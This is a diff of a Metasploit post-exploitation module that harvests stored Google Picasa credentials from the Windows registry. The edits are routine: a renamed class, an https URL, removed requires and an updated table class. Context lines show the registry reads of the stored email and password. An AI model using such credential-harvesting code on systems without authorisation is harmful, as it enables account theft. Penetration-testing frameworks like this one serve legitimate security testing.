@@ -1,14 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
 require 'msf/core/auxiliary/report'
 
-class Metasploit3 < Msf::Post
-
+class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Post::Windows::Priv
   include Msf::Auxiliary::Report
@@ -23,7 +20,7 @@ class Metasploit3 < Msf::Post
         'License'       => MSF_LICENSE,
         'Author'        =>
         [
-          'SecurityXploded Team',  #www.SecurityXploded.com
+          'Unknown', # SecurityXploded Team, www.SecurityXploded.com
           'Sil3ntDre4m <sil3ntdre4m[at]gmail.com>',
         ],
         'Platform'      => [ 'win' ],
@@ -73,7 +70,7 @@ class Metasploit3 < Msf::Post
       username = registry_getvaldata("HKCU\\Software\\Google\\Picasa\\Picasa2\\Preferences\\", 'GaiaEmail') || ''
       password = registry_getvaldata("HKCU\\Software\\Google\\Picasa\\Picasa2\\Preferences\\", 'GaiaPass')  || ''
 
-      credentials = Rex::Ui::Text::Table.new(
+      credentials = Rex::Text::Table.new(
           'Header'    => "Picasa Credentials",
           'Indent'    => 1,
           'Columns'   =>
